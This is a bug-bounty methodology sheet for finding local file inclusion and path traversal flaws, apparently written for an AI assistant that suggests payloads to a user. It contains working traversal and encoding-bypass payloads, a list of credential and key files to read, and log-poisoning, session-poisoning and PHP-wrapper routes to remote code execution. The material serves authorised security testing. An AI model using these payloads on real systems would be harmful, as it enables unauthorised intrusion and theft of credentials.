# LFI — Local File Inclusion / Path Traversal Hunting Methodology

## Types to Hunt

| Type | Description |
|---|---|
| Path Traversal | Read arbitrary files via `../` sequences in file path parameters |
| Local File Inclusion | Server includes/executes the file (PHP `include()`) |
| LFI → RCE | Combine LFI with log poisoning or session file control to achieve RCE |

---

## Finding Path Traversal Entry Points

**High-risk parameters:**
- `?file=`, `?page=`, `?template=`, `?path=`, `?include=`, `?load=`, `?view=`
- `?doc=`, `?pdf=`, `?download=`, `?resource=`, `?lang=`, `?module=`
- Image/file serving: `/download?name=file.pdf`, `/static?f=img.png`
- Language switching: `?lang=en` (may load `lang/en.php`)

**Source code red flags:**
```php
// PHP — vulnerable
include($_GET['page'] . '.php');
file_get_contents($_GET['file']);
readfile('/var/www/docs/' . $filename);

// Python — vulnerable
open('/data/' + user_input, 'r').read()
send_file('uploads/' + filename)
```

---

## Detection Payloads (suggest to user)

**Basic traversal (Linux):**
- `../../../../etc/passwd`
- `../../../etc/passwd`
- `/etc/passwd` (absolute path — if no sanitization at all)

**Windows traversal:**
- `..\..\..\..\windows\win.ini`
- `../../../../windows/win.ini`

**URL encoding bypasses:**
- `..%2F..%2F..%2Fetc%2Fpasswd`
- `%2e%2e%2f%2e%2e%2fetc%2fpasswd`
- Double encoding: `..%252F..%252Fetc%252Fpasswd`

**Null byte (older PHP < 5.3.4):**
- `../../../../etc/passwd%00`

**If suffix is appended by server (e.g., `.php`):**
- Try PHP wrappers: `php://filter/convert.base64-encode/resource=../../../../etc/passwd`
- The response will be base64 — decode to get file contents

---

## High-Value Target Files

| OS | File | What It Contains |
|---|---|---|
| Linux | `/etc/passwd` | User accounts (confirm traversal) |
| Linux | `/etc/shadow` | Password hashes (if root readable) |
| Linux | `/proc/self/environ` | Environment variables, API keys |
| Linux | `/proc/self/cmdline` | Running process command |
| Linux | `~/.ssh/id_rsa` | Private SSH key → auth |
| Linux | `/var/www/html/config.php` | DB credentials, API keys |
| Linux | `/var/log/apache2/access.log` | Log poisoning target |
| Windows | `C:\Windows\win.ini` | Confirm traversal |
| Windows | `C:\inetpub\wwwroot\web.config` | App config, credentials |
| Any | `.env`, `config.yml`, `settings.py` | Application secrets |

---

## LFI → RCE Escalation (PHP)

**Log Poisoning:**
1. Send a request with a PHP code execution payload in the User-Agent header — a one-liner that passes a GET parameter to an OS command function (e.g., `system()`, `passthru()`, or `shell_exec()`). Exact payload syntax: see HackTricks "LFI Log Poisoning" or PayloadsAllTheThings.
2. Include the Apache/Nginx access log via LFI:
   - `?page=../../../../var/log/apache2/access.log`
   - Alternative: `/proc/self/fd/[0-20]` — iterate fd numbers to find open log file descriptors without knowing the exact path
3. If log is displayed/included → RCE via `?page=...&cmd=id`

**Session File Poisoning:**
1. Inject PHP payload into a session variable (e.g., username field)
2. Find PHP session file path: typically `/tmp/sess_SESSIONID`
3. Include session file: `?page=../../../../tmp/sess_<sessionid>`

**PHP Wrappers (if `allow_url_fopen` or `allow_url_include`):**
- `php://input` — POST data as include source (POST body is treated as PHP and executed)
- `data://text/plain,[php-payload]` — inline execution via data URI; the payload runs as PHP code (requires `allow_url_include=On`). Exact syntax: HackTricks "LFI PHP Wrappers"
- `expect://id` — if `expect` wrapper enabled (rare)
- **PHP Filter Chain RCE (modern, no log access needed):** Chain PHP filters via `php://filter/convert.iconv.UTF8.CSISO2022KR|...` to construct arbitrary strings that get executed. This works even without write access to any file. Tool: `php_filter_chain_generator` on GitHub — generates the full chain payload from a target command.

---

## Impact Classification

| Finding | Severity |
|---|---|
| `/etc/passwd` readable (non-shadow) | Medium |
| Config files with DB credentials / API keys | High |
| `/etc/shadow` readable | Critical |
| SSH private key readable | Critical |
| LFI → RCE via log poisoning | Critical |
| Path traversal limited to non-sensitive dirs | Low |

## Evidence Requirements
1. Exact parameter and payload used
2. Actual file content returned (redact after first line to avoid data exposure)
3. HTTP request + truncated response (show first lines of `/etc/passwd`)
4. For RCE escalation: include the full chain (log poison + include)

## Do Not Report
- Path traversal that's blocked (returns 403 or sanitized path, no file content)
- Reading only non-sensitive application files that don't contain secrets
- Directory listing without file content (different vuln class)
